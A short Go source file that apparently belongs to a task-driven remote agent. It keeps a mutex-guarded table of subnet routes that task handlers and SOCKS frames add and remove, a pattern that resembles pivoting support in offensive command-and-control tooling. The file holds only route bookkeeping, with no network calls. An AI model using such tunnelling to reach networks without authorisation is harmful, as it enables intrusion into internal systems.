//go:build linux || windows || darwin
// +build linux windows darwin

package main

import (
	"fmt"
	"sync"
)

type TunnelRoute struct {
	Subnet string
	Active bool
}

var tunnelRoutes = map[string]*TunnelRoute{}
var tunnelRoutesMu sync.RWMutex

func handleTunnelAddRoute(task Task, res *TaskResult) {
	subnet := task.Command
	if subnet == "" {
		res.Error = "subnet is required (e.g. 10.10.0.0/16)"
		return
	}
	tunnelRoutesMu.Lock()
	tunnelRoutes[subnet] = &TunnelRoute{Subnet: subnet, Active: true}
	tunnelRoutesMu.Unlock()
	res.Output = fmt.Sprintf("tunnel route added: %s", subnet)
	if Debug {
		fmt.Printf("[tunnel] added route %s\n", subnet)
	}
}

func handleTunnelRemoveRoute(task Task, res *TaskResult) {
	subnet := task.Command
	if subnet == "" {
		res.Error = "subnet is required"
		return
	}
	tunnelRoutesMu.Lock()
	delete(tunnelRoutes, subnet)
	tunnelRoutesMu.Unlock()
	res.Output = fmt.Sprintf("tunnel route removed: %s", subnet)
	if Debug {
		fmt.Printf("[tunnel] removed route %s\n", subnet)
	}
}

// tunnelAddRouteFromFrame handles a "tunnel_add" SOCKS frame.
func tunnelAddRouteFromFrame(subnet string) {
	if subnet == "" {
		return
	}
	tunnelRoutesMu.Lock()
	tunnelRoutes[subnet] = &TunnelRoute{Subnet: subnet, Active: true}
	tunnelRoutesMu.Unlock()
	if Debug {
		fmt.Printf("[tunnel] frame added route %s\n", subnet)
	}
}

// tunnelRemoveRouteFromFrame handles a "tunnel_remove" SOCKS frame.
func tunnelRemoveRouteFromFrame(subnet string) {
	if subnet == "" {
		return
	}
	tunnelRoutesMu.Lock()
	delete(tunnelRoutes, subnet)
	tunnelRoutesMu.Unlock()
	if Debug {
		fmt.Printf("[tunnel] frame removed route %s\n", subnet)
	}
}
